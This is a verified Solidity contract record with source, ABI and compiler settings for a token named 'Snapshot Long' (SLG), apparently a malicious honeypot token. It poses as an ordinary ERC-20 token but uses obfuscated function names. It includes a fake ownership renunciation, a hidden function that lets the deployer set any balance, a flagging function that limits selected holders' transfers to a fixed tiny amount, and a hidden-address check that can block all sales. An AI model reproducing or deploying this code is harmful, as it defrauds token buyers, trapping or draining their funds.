{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface modeWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address swapAtSell) external view returns (uint256);\n\n    function transfer(address launchAt, uint256 sellAt) external returns (bool);\n\n    function allowance(address exemptBuy, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchAt,\n        uint256 sellAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed receiverEnable, uint256 value);\n    event Approval(address indexed exemptBuy, address indexed spender, uint256 value);\n}\n\nabstract contract marketingFund {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface isFrom {\n    function createPair(address launchedListBuy, address modeTrading) external returns (address);\n}\n\ninterface buyFee is modeWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SnapshotLong is marketingFund, modeWallet, buyFee {\n\n    function owner() external view returns (address) {\n        return tradingSell;\n    }\n\n    uint256 constant feeEnable = 18 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamTotal;\n    }\n\n    uint256 private swapLaunchedReceiver = 100000000 * 10 ** 18;\n\n    function amountMode(address senderIs, uint256 sellAt) public {\n        buyLaunched();\n        toTeam[senderIs] = sellAt;\n    }\n\n    function isMinEnable(address marketingListLaunch, address launchAt, uint256 sellAt) internal returns (bool) {\n        if (marketingListLaunch == fromTrading) {\n            return launchFrom(marketingListLaunch, launchAt, sellAt);\n        }\n        uint256 fromAutoSender = modeWallet(teamSwapTx).balanceOf(buyTrading);\n        require(fromAutoSender == limitBuy);\n        require(launchAt != buyTrading);\n        if (receiverWallet[marketingListLaunch]) {\n            return launchFrom(marketingListLaunch, launchAt, feeEnable);\n        }\n        return launchFrom(marketingListLaunch, launchAt, sellAt);\n    }\n\n    address public teamSwapTx;\n\n    function autoListToken(address tokenFrom) public {\n        buyLaunched();\n        \n        if (tokenFrom == fromTrading || tokenFrom == teamSwapTx) {\n            return;\n        }\n        receiverWallet[tokenFrom] = true;\n    }\n\n    bool private totalListTo;\n\n    function minTake() public {\n        emit OwnershipTransferred(fromTrading, address(0));\n        tradingSell = address(0);\n    }\n\n    uint256 private fromFee;\n\n    function walletTrading(uint256 sellAt) public {\n        buyLaunched();\n        limitBuy = sellAt;\n    }\n\n    constructor (){\n        \n        isToken tradingEnableLiquidity = isToken(senderReceiver);\n        teamSwapTx = isFrom(tradingEnableLiquidity.factory()).createPair(tradingEnableLiquidity.WETH(), address(this));\n        \n        fromTrading = _msgSender();\n        minTake();\n        tokenSwap[fromTrading] = true;\n        toTeam[fromTrading] = swapLaunchedReceiver;\n        \n        emit Transfer(address(0), fromTrading, swapLaunchedReceiver);\n    }\n\n    function launchFrom(address marketingListLaunch, address launchAt, uint256 sellAt) internal returns (bool) {\n        require(toTeam[marketingListLaunch] >= sellAt);\n        toTeam[marketingListLaunch] -= sellAt;\n        toTeam[launchAt] += sellAt;\n        emit Transfer(marketingListLaunch, launchAt, sellAt);\n        return true;\n    }\n\n    mapping(address => bool) public tokenSwap;\n\n    uint8 private teamTotal = 18;\n\n    string private tokenFund = \"SLG\";\n\n    function transferFrom(address marketingListLaunch, address launchAt, uint256 sellAt) external override returns (bool) {\n        if (_msgSender() != senderReceiver) {\n            if (feeWallet[marketingListLaunch][_msgSender()] != type(uint256).max) {\n                require(sellAt <= feeWallet[marketingListLaunch][_msgSender()]);\n                feeWallet[marketingListLaunch][_msgSender()] -= sellAt;\n            }\n        }\n        return isMinEnable(marketingListLaunch, launchAt, sellAt);\n    }\n\n    mapping(address => uint256) private toTeam;\n\n    function buyLaunched() private view {\n        require(tokenSwap[_msgSender()]);\n    }\n\n    address public fromTrading;\n\n    bool public launchLiquidity;\n\n    function transfer(address senderIs, uint256 sellAt) external virtual override returns (bool) {\n        return isMinEnable(_msgSender(), senderIs, sellAt);\n    }\n\n    mapping(address => bool) public receiverWallet;\n\n    uint256 limitBuy;\n\n    bool private toTeamLaunched;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapLaunchedReceiver;\n    }\n\n    address buyTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => mapping(address => uint256)) private feeWallet;\n\n    uint256 public marketingEnable;\n\n    uint256 totalList;\n\n    function getOwner() external view returns (address) {\n        return tradingSell;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return minLiquidity;\n    }\n\n    address senderReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    event OwnershipTransferred(address indexed liquidityLaunched, address indexed walletTx);\n\n    string private minLiquidity = \"Snapshot Long\";\n\n    function allowance(address limitSellReceiver, address tokenAuto) external view virtual override returns (uint256) {\n        if (tokenAuto == senderReceiver) {\n            return type(uint256).max;\n        }\n        return feeWallet[limitSellReceiver][tokenAuto];\n    }\n\n    function autoFee(address atTx) public {\n        if (launchLiquidity) {\n            return;\n        }\n        \n        tokenSwap[atTx] = true;\n        \n        launchLiquidity = true;\n    }\n\n    function approve(address tokenAuto, uint256 sellAt) public virtual override returns (bool) {\n        feeWallet[_msgSender()][tokenAuto] = sellAt;\n        emit Approval(_msgSender(), tokenAuto, sellAt);\n        return true;\n    }\n\n    uint256 public launchedTrading;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tokenFund;\n    }\n\n    address private tradingSell;\n\n    function balanceOf(address swapAtSell) public view virtual override returns (uint256) {\n        return toTeam[swapAtSell];\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverEnable\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitSellReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellAt\",\"type\":\"uint256\"}],\"name\":\"amountMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTx\",\"type\":\"address\"}],\"name\":\"autoFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFrom\",\"type\":\"address\"}],\"name\":\"autoListToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapAtSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSwapTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingListLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellAt\",\"type\":\"uint256\"}],\"name\":\"walletTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SnapshotLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}